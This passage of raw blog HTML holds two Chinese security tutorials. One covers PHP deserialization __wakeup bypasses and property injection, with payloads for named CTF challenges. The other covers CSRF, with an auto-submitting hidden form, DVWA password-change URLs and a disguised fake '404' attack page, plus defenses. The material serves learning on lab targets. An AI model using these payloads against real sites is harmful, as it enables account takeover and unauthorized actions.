class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username===<span class="string">'zhangsan'</span>&amp;&amp;this-&gt;$password===<span class="string">'123456'</span>) &#123;</span><br><span class="line">			<span class="comment"># code...</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"flag&#123;nice!&#125;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"stop hacker!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$username=<span class="string">'zhangsan'</span>;</span><br><span class="line">$password=<span class="string">'123456'</span>;</span><br><span class="line">$a=<span class="keyword">new</span> test($username,$password);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>得到结果<br><img src="https://img-blog.csdnimg.cn/2020111720392718.png#pic_center" alt="序列化类结果"></p>
-<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>既然有了序列化函数<code>serialize</code>，那反序列化函数就能猜出来是<code>unserialize</code>。<br>在这里需要注意的是<code>若被反序列化的变量是一个对象，在成功重新构造对象之后，PHP会自动地试图去调用__wakeup()成员函数（如果存在的话）</code><br>也就是说比如在上面的例子中，若加入</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$b=serialize($a);</span><br><span class="line">$test=unserialize($b);</span><br></pre></td></tr></table></figure>
-<p>那么就会得到<br><img src="https://img-blog.csdnimg.cn/20201117204742877.png#pic_center" alt="得到结果"><br>即在检测到这个反序列化对象是个类之后，发现有<code>__wakeup()</code>函数，会执行这个函数。而在源码中是执行了让一个if判断，满足输出指定内容。在这里也可以进行一个修改序列化的值，从而达到相关的目的。</p>
-<h2 id="反序列化绕过"><a href="#反序列化绕过" class="headerlink" title="反序列化绕过"></a>反序列化绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行,并且不会报错,可以被正常反序列化</span><br></pre></td></tr></table></figure>
-<p>也就是说，在实际题目中，可以通过修改指定的值使其大于原值，从而达到绕过的目的。<br>也就是说假如现在有一串这个代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $a=<span class="string">'flag&#123;nice!&#125;'</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a=<span class="string">'go out,hacker!'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="string">'O:4:"test":1:&#123;s:1:"a";s:11:"flag&#123;nice!&#125;";&#125;'</span>;</span><br><span class="line">$b=unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>大致的题目意思就是有一个类，里面的变量a为<code>flag字符串</code>，然后需要输出，但是在上面说的会调用<code>wakeup函数</code>，导致无法输出flag字符串。即<br><img src="https://img-blog.csdnimg.cn/20201118200301486.png#pic_center" alt="正常输出"><br>但是现在需要输出它，所以就可以用上面说的方法来绕过<code>wakeup</code>函数，即构造payload为<code>a=O:4:&quot;test&quot;:2:{s:1:&quot;a&quot;;s:11:&quot;flag{nice!}&quot;;}</code><br>此时输出为<br><img src="https://img-blog.csdnimg.cn/20201118200451907.png#pic_center" alt="要求输出"><br>从而达到了绕过的想法。</p>
-<h2 id="序列化利用"><a href="#序列化利用" class="headerlink" title="序列化利用"></a>序列化利用</h2><p>反序列化可以绕过，同样序列化也可以进行利用。<br>假如现在的代码为</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $username;</span><br><span class="line">	<span class="keyword">public</span> $password;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;username=$username;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username===<span class="string">'zhangsan'</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">				<span class="keyword">echo</span> $flag;	</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'hahaha'</span>,<span class="string">'heyheyhey'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$username=<span class="string">'lisi'</span>;</span><br><span class="line">$password=$_GET[<span class="number">1</span>];</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($username,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>通过源码知需要绕过wakeup函数里的if判断，然后执行语句，但是username变量值被写死，因此这时候就可以利用序列化进行操作。<br>首先对类进行序列化查看一下<br><img src="https://img-blog.csdnimg.cn/20201118204224460.png#pic_center" alt="序列化结果"></p>
-<p>发现本应该是<code>hahaha</code>的变成了<code>heyheyhey</code><br>然后构造一下payload的一部分：<code>&quot;;s:8:&quot;username&quot;;s:8:&quot;zhangsan&quot;;}</code>共30个字符，然后字符替换是有3个字符，所以应该构造最终payload为：<code>hahahahahahahahahahahahahahahahahahahahahahahahahahahahahahaha&quot;;s:8:&quot;username&quot;;s:8:&quot;zhangsan&quot;;}</code><br>运行结果<br><img src="https://img-blog.csdnimg.cn/20201118204417285.png#pic_center" alt="结果"><br>发现<code>username</code>值被成功改为<code>zhangsan</code>。说明成功。<br>所以效果最终为：<br><img src="https://img-blog.csdnimg.cn/20201118224629278.png#pic_center" alt="最终结果"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意：如果在本地实验中发现修改之后页面提示错误的，可以在源码里加一个函数</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_unserialize</span><span class="params">($serial_str)</span> </span>&#123;</span><br><span class="line">$out = preg_replace(<span class="string">'!s:(\d+):"(.*?)";!se'</span>, <span class="string">"'s:'.strlen('$2').':\"$2\";'"</span>, $serial_str );</span><br><span class="line"><span class="keyword">return</span> unserialize($out);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>是在报 <code>unserialize(): Error at offset 124 of 181 bytes in</code>错误时可以尝试这个自建函数来进行实验。</strong></p>
-<h3 id="ctf题目实例"><a href="#ctf题目实例" class="headerlink" title="ctf题目实例"></a>ctf题目实例</h3><h4 id="攻防世界-unserialize3"><a href="#攻防世界-unserialize3" class="headerlink" title="攻防世界 unserialize3"></a>攻防世界 unserialize3</h4><p>打开题目，发现源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
-<p>所以，根据上面讲的，可以直接将flag字符串那一列进行序列化，然后修改值得到flag。<br>先序列化得到<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>，修改得<code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><br><img src="https://img-blog.csdnimg.cn/20201118225636493.png#pic_center" alt="flag"></p>
-<h4 id="攻防世界-Web-php-unserialize"><a href="#攻防世界-Web-php-unserialize" class="headerlink" title="攻防世界 Web_php_unserialize"></a>攻防世界 Web_php_unserialize</h4><p>打开题目<br><img src="https://img-blog.csdnimg.cn/20201118225745500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="源码"><br>同样，修改一下，进行序列化，然后<code>O:4:&quot;Demo&quot;:1:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</code>，然后修改得到<code>O:+4:&quot;Demo&quot;:2:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</code>，这里注意还需要一次base64编码才能得到。</p>
-<h4 id="ctfshow-月饼杯第一题次夜圆"><a href="#ctfshow-月饼杯第一题次夜圆" class="headerlink" title="ctfshow 月饼杯第一题次夜圆"></a>ctfshow 月饼杯第一题次夜圆</h4><p>具体源码和上面那个序列化利用是一样的，也可以说上面的序列化利用中举的例子就是这个题目，按照上面得方法，构造最终payload为：<code>?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;}</code>，提交得到flag。<br><img src="https://img-blog.csdnimg.cn/20201118230251415.png#pic_center" alt="得到flag"></p>
-<h1 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h1><p>还是经常说的那句话，自己总结的只是一些入门的东西，更加深刻得方面需要慢慢学习下去，努力下去，一切都有可能，加油。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/11/13/csrf%E6%BC%8F%E6%B4%9E%E6%B5%85%E8%B0%88/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/13/csrf%E6%BC%8F%E6%B4%9E%E6%B5%85%E8%B0%88/" class="post-title-link" itemprop="url">csrf漏洞浅谈</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-11-13 00:48:38 / Modified: 00:47:59" itemprop="dateCreated datePublished" datetime="2020-11-13T00:48:38+08:00">2020-11-13</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>@<a href="csrf漏洞浅谈">TOC</a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>菜狗本人的手终于伸向了csrf漏洞攻击<strong>记录一下</strong></p>
-<h1 id="csrf漏洞介绍"><a href="#csrf漏洞介绍" class="headerlink" title="csrf漏洞介绍"></a>csrf漏洞介绍</h1><h2 id="什么是csrf"><a href="#什么是csrf" class="headerlink" title="什么是csrf"></a>什么是csrf</h2><p>csrf全称<code>Cross Site Request Forgery</code>，翻译过来就是<code>跨站域请求伪造</code>。是一种网络攻击手段。与xss不同，xss是利用受信任的用户，而csrf则是伪装成受信任用户。而csrf不太流行，所以一般认为xss比csrf更加具有危险性。</p>
-<h2 id="csrf怎样实现"><a href="#csrf怎样实现" class="headerlink" title="csrf怎样实现"></a>csrf怎样实现</h2><p>用csrf可以做什么？在菜鸡我的看法就是攻击者利用被攻击者发送受站点信任的请求，从而达到自身的某些目的。</p>
-<h2 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h2><p>假如张三在某银行存了一笔钱，某一天张三在该行的官网进行转账。假设官网ip为<code>http://csrfxj.com/zhuanzhang.php?name=ww&amp;money=1000</code>，而官网存在csrf漏洞，且是get请求方式，此时服务器收到请求后验证cookie等，确认是本人操作，所以会进行回复，操作成功。而如果李四想要从此处进行攻击，就会构造一个payload：<code>http://csrfxj.com/zhuanzhang.php?name=ls&amp;money=100000</code>，然后此时张三刚刚在官网进行了操作，cookie等还未过期，在李四的诱骗下点击了这个链接，后台服务器会再次响应，认为是本人操作，再次进行操作，这时就会发生，转账人<code>张三</code>，收钱人<code>李四</code>，金额<code>100000</code>。然后张三就会在不知情的时候进行了一笔稀里糊涂的转账。</p>
-<h2 id="csrf漏洞攻击原理"><a href="#csrf漏洞攻击原理" class="headerlink" title="csrf漏洞攻击原理"></a>csrf漏洞攻击原理</h2><p>我本来一直认为就是利用上述方式进行攻击，但是在看了大佬博客之后才知道csrf攻击分为两种方式</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一、狭义的csrf攻击：指在攻击者已经将代码植入受害用户的浏览器访问的页面的前提下，以“受害用户”的身份向服务端发起一个伪造的http请求，从而实现服务器CURD来执行读写操作。</span><br><span class="line">二、广义的csrf攻击：攻击者将一个http接口中需要传递的所有参数都预测出来，然后不管以什么方式，都可以来任意调用你的接口，对服务器实现CURD</span><br></pre></td></tr></table></figure>
-<h2 id="csrf攻击产生条件"><a href="#csrf攻击产生条件" class="headerlink" title="csrf攻击产生条件"></a>csrf攻击产生条件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一、被攻击者在登陆了web网页，并且在本地生成了cookie</span><br><span class="line">二、在cookie未过期的情况下，登登录了攻击者的页面，利用同一个浏览器。</span><br></pre></td></tr></table></figure>
-<h1 id="csrf攻击的常见方式"><a href="#csrf攻击的常见方式" class="headerlink" title="csrf攻击的常见方式"></a>csrf攻击的常见方式</h1><p>csrf攻击一般分为GET型和POST型。<br>这里利用<a href="http://www.nanhack.com/payload/xss/csrf1.php" target="_blank" rel="noopener">必火团队的靶场</a>和本地搭建的DVWA靶场进行实验。</p>
-<h2 id="GET型方式"><a href="#GET型方式" class="headerlink" title="GET型方式"></a>GET型方式</h2><p><img src="https://img-blog.csdnimg.cn/20201112230440498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="必火团队靶场"><br>发现转账页面，正常转账会发现账户正常减少财产。当点击了下方提供的攻击者页面时，<img src="https://img-blog.csdnimg.cn/20201112230547357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="点击结果"><br>发现提示账户钱少了，回去查看，发现少了1000。查看攻击页面源码发现<img src="https://img-blog.csdnimg.cn/20201112230636790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="页面源码"><br>其中的<code>&lt;image src &gt;</code>属性标签里的链接，和正常转账是一样的，只是名字钱财不同。这是一种实现的方式。<br>在上面的例子中是直接构造的payload，隐蔽性太低，正常人一眼就能看出来不正常，所以一般会进行IP的隐藏<br>这里介绍几种常用的IP隐藏方式：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一、利用a标签</span><br><span class="line">二、利用HTML的src实现，在页面中不会进行显示</span><br><span class="line">三、利用background属性里的url功能链接</span><br></pre></td></tr></table></figure>
-<h2 id="POST方式"><a href="#POST方式" class="headerlink" title="POST方式"></a>POST方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=<span class="string">"csrf"</span> action=<span class="string">"http://edu.xss.tv/payload/xss/csrf2.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"name"</span> value=<span class="string">"zhangsan520"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"money"</span> value=<span class="string">"1000"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;document.csrf.submit();&lt;/script&gt;</span><br><span class="line">&lt;a href=<span class="string">"http://edu.xss.tv/user.php"</span>&gt;返回用户管理&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-<p>post方式一般是利用一个可以自动提交的表单进行攻击，当用户进入指定页面后会进行自动提交。达到目的。所以危害性没get方式高。</p>
-<h1 id="csrf漏洞检测"><a href="#csrf漏洞检测" class="headerlink" title="csrf漏洞检测"></a>csrf漏洞检测</h1><p>那么如何检测页面是否存在csrf漏洞呢？这里用的是brupsuit进行检测。<br>在浏览器里进行抓包，bp有一个<code>CSRF POC</code>功能，自动生成攻击页面，在里面修改参数，提交之后发现是否有变化，若有则存在反之没有。</p>
-<h1 id="csrf漏洞的防御"><a href="#csrf漏洞的防御" class="headerlink" title="csrf漏洞的防御"></a>csrf漏洞的防御</h1><blockquote>
-<p>CSRF的防御可以从两个方面考虑，一个是后台接口层做防御；另一个则是在前端做防御，这种不同源的请求，不可以带cookie。</p>
-</blockquote>
-<h2 id="前端防御"><a href="#前端防御" class="headerlink" title="前端防御"></a>前端防御</h2><blockquote>
-<p>谷歌提出了same-site cookies概念，same-site cookies 是基于 Chrome 和 Mozilla 开发者花了三年多时间制定的 IETF 标准。它是在原有的Cookie中，新添加了一个SameSite属性，它标识着在非同源的请求中，是否可以带上Cookie，它可以设置为3个值，分别为：Strict、Lax、None<br>Strict是最严格的，它完全禁止在跨站情况下，发送Cookie。只有在自己的网站内部发送请求，才会带上Cookie。不过这个规则过于严格，会影响用户的体验。比如在一个网站中有一个链接，这个链接连接到了GitHub上，由于SameSite设置为Strict，跳转到GitHub后，GitHub总是未登录状态。<br>Lax的规则稍稍放宽了些，大部分跨站的请求也不会带上Cookie，但是一些导航的Get请求会带上Cookie，如下：<br><img src="https://img-blog.csdnimg.cn/20201112231841983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="引用"><br>None就是关闭SameSite属性，所有的情况下都发送Cookie。不过SameSite设置None，还要同时设置Cookie的Secure属性，否则是不生效的。</p>
-</blockquote>
-<p>以上引用来自云栖社区一篇<a href="https://yq.aliyun.com/articles/738512" target="_blank" rel="noopener">很详细的博客</a> 如有侵权，联系删除。<br>因为我懒，所以就不自己总结了（坚持白嫖）。</p>
-<h2 id="后端防御"><a href="#后端防御" class="headerlink" title="后端防御"></a>后端防御</h2><blockquote>
-<p>第一种，CSRF Token的方式。这种方式是在表单页面生成一个随机数，这个随机数一定要后端生成，并且对这个随机数进行存储。<br>通过请求头中的referer字段判断请求的来源。每一个发送给后端的请求，在请求头中都会包含一个referer字段，这个字段标识着请求的来源。如果请求是从银行网站发出的，这个字段会是银行网站转账页的链接，比如：<a href="https://www.a-bank.com/transfer-view；如果是从恶意网站发出的，那么referer字段一定不会是银行网站" target="_blank" rel="noopener">https://www.a-bank.com/transfer-view；如果是从恶意网站发出的，那么referer字段一定不会是银行网站</a></p>
-</blockquote>
-<h1 id="DVWA靶场练习csrf攻击"><a href="#DVWA靶场练习csrf攻击" class="headerlink" title="DVWA靶场练习csrf攻击"></a>DVWA靶场练习csrf攻击</h1><h2 id="low难度"><a href="#low难度" class="headerlink" title="low难度"></a>low难度</h2><p>所谓low难度就是明显的没有难度。<br>拿到手之后直接url修改参数就实现了。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Do the passwords match?</span></span><br><span class="line">	<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">		$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update the database</span></span><br><span class="line">		$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">		$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with passwords matching</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>查看low难度的源码，首先进行判断两个新密码输入的值是否一样，若一样调用<code>mysql_real_escape_string()</code>函数来进行对字符串的过滤操作，然后调用<code>MD5</code>对new_password进行加密，保存到数据库中。<code>mysql_real_escape_string()</code>函数由于对字符串进行了过滤操作，所以有效的防止了sql注入操作，但是并没有对于csrf进行防御操作。因此可以进行csrf攻击。<br>正常的修改密码payload：<code>http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</code><br>直接对payload进行修改：<code>http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=root&amp;password_conf=root&amp;Change=Change#</code><br>在上述操作中，密码就会由修改的password变为root。<img src="https://img-blog.csdnimg.cn/20201112233506238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="密码修改成功"><br>但是这样子用户一眼就能知道自己的密码被修改了，而且这个链接一般人肯定不会随便点的。所以接下来据要进行对这个链接的格式修改。</p>
-<h3 id="使用短链接进行格式修改"><a href="#使用短链接进行格式修改" class="headerlink" title="使用短链接进行格式修改"></a>使用短链接进行格式修改</h3><p><img src="https://img-blog.csdnimg.cn/20201112233813425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="修改成功"><br><a href="http://tool.chinaz.com/tools/dwz.aspx" target="_blank" rel="noopener">地址在这</a></p>
-<h3 id="构造攻击页面"><a href="#构造攻击页面" class="headerlink" title="构造攻击页面"></a>构造攻击页面</h3><p>在实际攻击中，攻击者可以利用自己构造的一个虚假页面让被攻击者点击来实现攻击操作。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;<span class="number">404</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;image src=<span class="string">"http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=root&amp;password_conf=root&amp;Change=Change#"</span> /&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</span><br><span 